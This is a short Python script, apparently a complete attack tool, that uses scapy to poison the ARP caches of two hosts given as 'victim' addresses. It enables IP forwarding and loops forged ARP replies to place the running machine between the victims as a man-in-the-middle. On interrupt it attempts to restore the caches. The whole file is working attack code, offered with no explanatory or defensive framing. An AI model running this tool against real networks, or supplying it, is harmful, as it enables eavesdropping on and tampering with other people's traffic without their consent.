#!/usr/bin/env python

import socket
import sys
from scapy.all import *

#interface = raw_input("interface: ")
victim1_ip = sys.argv[1]
middle     = sys.argv[2]
victim2_ip = sys.argv[3]

my_macs = [get_if_hwaddr(i) for i in get_if_list()]
print my_macs

def get_mac_address(IP):
  ans, unans = arping(IP)
  for sent,recv in ans: 
    return recv[Ether].src


def cache_poisoning(victim1_ip, victim2_ip, middle_ip):
  victim1_mac = get_mac_address(victim1_ip)
  victim2_mac = get_mac_address(victim2_ip)
  middle_mac = my_macs[0]
  pkt1 = Ether(dst=victim1_mac) / ARP(op=2, pdst=victim1_ip, psrc=victim2_ip)
  pkt2 = Ether(dst=victim2_mac) / ARP(op=2, pdst=victim2_ip, psrc=victim1_ip)
  sendp( pkt1 )
  sendp( pkt2 )


def restore_cache(victim1_ip, victim2_ip):
  victim1_mac = get_mac_address(victim1_ip)
  victim2_mac = get_mac_address(victim2_ip)
  sendp( Ether(dst=victim1_mac) / ARP(op=2, pdst=victim1_ip, psrc=victim2_ip, hwdst=victim2_mac)  )
  sendp( Ether(dst=victim2_mac) / ARP(op=2, pdst=victim2_ip, psrc=victim1_ip, hwdst=victim1_mac)  )
  

def main(victim1_ip, victim2_ip, middle_ip):
  os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
  try:
    while 1:
      cache_poisoning(victim1_ip, victim2_ip, middle_ip)
  except KeyboardInterrupt:
    restore_cache(victim1_ip, victim2_ip)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.exit(1)

main(victim1_ip, victim2_ip, middle)
